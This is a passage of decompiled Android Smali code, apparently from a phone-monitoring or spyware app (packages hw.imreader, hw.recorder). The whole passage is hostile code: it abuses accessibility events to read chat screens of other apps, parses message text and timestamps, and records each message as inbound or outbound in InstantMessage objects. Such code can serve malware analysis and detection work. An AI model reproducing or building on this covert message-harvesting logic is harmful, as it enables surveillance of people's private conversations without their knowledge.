    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_15

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_15

    invoke-virtual {v2, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_15

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_15

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lhw/imreader/a;->M(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_15

    invoke-static {}, Lhw/recorder/d;->l()Z

    move-result v0

    if-eqz v0, :cond_15

    iget v0, v1, Lhw/imreader/a;->g:I

    invoke-static {}, Lhw/utils/o;->E0()Z

    move-result v2

    invoke-static {v0, v2}, Lhw/recorder/d;->q(IZ)V

    goto/16 :goto_c

    :cond_2
    const/4 v6, 0x0

    iput-object v6, v1, Lhw/imreader/k;->q:Ljava/lang/String;

    const/4 v7, 0x6

    invoke-static {v2, v4, v6, v7}, Lhw/imreader/l;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;[II)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_3

    const/16 v7, 0x64

    invoke-static {v2, v4, v7}, Lhw/imreader/l;->v(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    :cond_3
    if-eqz v7, :cond_14

    const-string v0, "android.widget.ScrollView"

    invoke-static {v7, v0}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v2

    if-nez v2, :cond_4

    move/from16 v2, p3

    invoke-virtual {v1, v2, v7, v6}, Lhw/imreader/a;->i0(ILandroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    goto/16 :goto_c

    :cond_4
    iget v2, v1, Lhw/imreader/a;->g:I

    invoke-static {v2}, Lhw/recorder/d;->i(I)V

    invoke-direct {v1, v7}, Lhw/imreader/k;->m0(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lhw/imreader/k;->q:Ljava/lang/String;

    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_13

    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_13

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v9, "android.view.View"

    invoke-static {v7, v9}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v7

    const/4 v9, 0x1

    new-array v10, v9, [Z

    aput-boolean v9, v10, v8

    invoke-virtual {v7}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v11

    :cond_5
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v12

    if-eqz v12, :cond_6

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    iget-object v13, v1, Lhw/imreader/k;->q:Ljava/lang/String;

    invoke-direct {v1, v12, v2, v10, v13}, Lhw/imreader/k;->p0(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/HashMap;[ZLjava/lang/String;)Z

    move-result v12

    if-nez v12, :cond_5

    :cond_6
    invoke-static {v7}, Lhw/imreader/a;->V(Ljava/util/List;)V

    invoke-virtual {v2}, Ljava/util/HashMap;->size()I

    move-result v7

    if-lez v7, :cond_12

    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    invoke-virtual {v1, v2}, Lhw/imreader/a;->H(Ljava/util/HashMap;)Ljava/util/List;

    move-result-object v12

    invoke-interface {v12}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v12

    move-object v13, v6

    move-object v14, v13

    :goto_2
    invoke-interface {v12}, Ljava/util/Iterator;->hasNext()Z

    move-result v15

    if-eqz v15, :cond_11

    invoke-interface {v12}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v15

    invoke-virtual {v2, v15}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Ljava/lang/String;

    const-string v6, "#"

    invoke-virtual {v15, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v6

    if-nez v6, :cond_7

    invoke-virtual {v15, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v13

    move-object/from16 v21, v0

    move-object/from16 p2, v2

    move-object/from16 v16, v3

    move-object/from16 p3, v4

    move-object/from16 v18, v12

    const/4 v0, 0x1

    const/4 v3, 0x0

    const/4 v14, 0x0

    goto/16 :goto_a

    :cond_7
    sget-object v6, Lhw/database/ValsDB$MESSAGE_DIRECTION;->OUTBOUND:Lhw/database/ValsDB$MESSAGE_DIRECTION;

    invoke-virtual {v15, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    array-length v9, v8
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v16, ""

    move-object/from16 p2, v2

    move-object/from16 p3, v4

    move-object/from16 v18, v12

    move-object/from16 v4, v16

    const/4 v2, 0x0

    const/16 v17, 0x0

    move-object/from16 v16, v3

    move-object v3, v4

    :goto_3
    const-string v12, " "

    if-ge v2, v9, :cond_c

    move/from16 v19, v9

    :try_start_1
    aget-object v9, v8, v2

    invoke-static {v9}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v20

    if-nez v20, :cond_b

    if-nez v17, :cond_9

    move-object/from16 v20, v8

    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v8

    move-object/from16 v21, v0

    const/4 v0, 0x3

    if-le v8, v0, :cond_a

    add-int/lit8 v8, v8, -0x3

    invoke-virtual {v9, v8}, Ljava/lang/String;->charAt(I)C

    move-result v0

    const/16 v8, 0x3a

    if-ne v0, v8, :cond_a

    invoke-virtual {v9, v12}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v8, 0x1

    if-ge v0, v8, :cond_8

    move-object/from16 v17, v9

    goto :goto_4

    :cond_8
    add-int/lit8 v6, v0, 0x1

    invoke-virtual {v9, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v6

    const/4 v8, 0x0

    invoke-virtual {v9, v8, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    sget-object v0, Lhw/database/ValsDB$MESSAGE_DIRECTION;->INBOUND:Lhw/database/ValsDB$MESSAGE_DIRECTION;

    move-object/from16 v17, v6

    move-object v6, v0

    :goto_4
    move-object/from16 v14, v17

    goto :goto_5

    :cond_9
    move-object/from16 v21, v0

    move-object/from16 v20, v8

    :cond_a
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-object v3, v0

    move-object/from16 v4, v16

    goto :goto_5

    :cond_b
    move-object/from16 v21, v0

    move-object/from16 v20, v8

    :goto_5
    add-int/lit8 v2, v2, 0x1

    move/from16 v9, v19

    move-object/from16 v8, v20

    move-object/from16 v0, v21

    goto :goto_3

    :cond_c
    move-object/from16 v21, v0

    if-nez v17, :cond_d

    if-eqz v14, :cond_d

    move-object v0, v14

    goto :goto_6

    :cond_d
    move-object/from16 v0, v17

    :goto_6
    const-string v2, "\'"

    if-nez v13, :cond_e

    :try_start_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, " NO DATE! \'"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_7
    invoke-static {v5, v0}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    move-object v6, v14

    const/4 v0, 0x1

    const/4 v3, 0x0

    :goto_8
    const/4 v8, 0x0

    goto/16 :goto_9

    :cond_e
    if-nez v0, :cond_f

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, " NO TIME! \'"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_7

    :cond_f
    invoke-virtual {v1, v13, v0}, Lhw/imreader/a;->e0(Ljava/lang/String;Ljava/lang/String;)[J

    move-result-object v4

    const/4 v8, 0x0

    aget-wide v19, v4, v8

    const-wide/16 v8, -0x1

    cmp-long v17, v19, v8

    if-eqz v17, :cond_10

    new-instance v0, Lhw/imreader/InstantMessage;

    invoke-direct {v0}, Lhw/imreader/InstantMessage;-><init>()V

    move-object v9, v14

    const/4 v8, 0x1

    aget-wide v14, v4, v8

    long-to-int v8, v14

    div-int/lit16 v8, v8, 0x3e8

    iput v8, v0, Lhw/imreader/InstantMessage;->_day_time:I

    invoke-virtual {v0, v3}, Lhw/imreader/InstantMessage;->setText(Ljava/lang/String;)V

    iput-object v6, v0, Lhw/imreader/InstantMessage;->_direction:Lhw/database/ValsDB$MESSAGE_DIRECTION;

    const/4 v3, 0x0

    iput-object v3, v0, Lhw/imreader/InstantMessage;->_from:Ljava/lang/String;

    new-instance v6, Ljava/util/Date;

    const/4 v8, 0x0

    aget-wide v14, v4, v8

    const/4 v8, 0x1

    aget-wide v19, v4, v8

    add-long v14, v14, v19

    invoke-direct {v6, v14, v15}, Ljava/util/Date;-><init>(J)V

    iput-object v6, v0, Lhw/imreader/InstantMessage;->_time_stamp:Ljava/util/Date;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v7, v0, v2, v10, v11}, Lhw/imreader/a;->s(Ljava/util/ArrayList;Lhw/imreader/InstantMessage;Ljava/lang/String;J)Z

    move-object v6, v9

    const/4 v0, 0x1

    goto :goto_8

    :cond_10
    move-object v9, v14

    const/4 v3, 0x0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "\t* ERR Empty date: "

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v6, " \'"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "_"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\' "

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object v6, v9

    const/4 v0, 0x0

    aget-wide v8, v4, v0

    invoke-virtual {v2, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v0, 0x1

    aget-wide v8, v4, v0

    invoke-virtual {v2, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v4, 0xa

    invoke-virtual {v15}, Ljava/lang/String;->length()I

    move-result v8

    invoke-static {v4, v8}, Ljava/lang/Math;->min(II)I

    move-result v4

    const/4 v8, 0x0

    invoke-virtual {v15, v8, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v5, v2}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    :goto_9
    move-object v14, v6

    :goto_a
    move-object/from16 v2, p2

    move-object/from16 v4, p3

    move-object v6, v3

    move-object/from16 v3, v16

    move-object/from16 v12, v18

    move-object/from16 v0, v21

    const/4 v9, 0x1

    goto/16 :goto_2

    :cond_11
    move-object/from16 v21, v0

    move-object/from16 p2, v2

    move-object/from16 v16, v3

    move-object/from16 p3, v4

    move-object v3, v6

    iget-object v0, v1, Lhw/imreader/k;->q:Ljava/lang/String;

    invoke-virtual {v1, v7, v0}, Lhw/imreader/a;->j0(Ljava/util/ArrayList;Ljava/lang/String;)V

    goto :goto_b

    :cond_12
    move-object/from16 v21, v0

    move-object/from16 p2, v2

    move-object/from16 v16, v3

    move-object/from16 p3, v4

    move-object v3, v6

    :goto_b
    move-object/from16 v2, p2

    move-object/from16 v4, p3

    move-object v6, v3

    move-object/from16 v3, v16

    move-object/from16 v0, v21

    goto/16 :goto_1

    :cond_13
    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lhw/imreader/a;->V(Ljava/util/List;)V

    goto :goto_c

    :cond_14
    const-string v3, " NO CONTENT! \'"

    invoke-static {v5, v3}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    invoke-static {v0, v2, v3}, Lhw/imreader/l;->a0(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_c

    :catch_0
    move-exception v0

    const-string v2, "prsE"

    invoke-static {v5, v2, v0}, Lhw/utils/l;->u(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_15
    :goto_c
    return-void
.end method
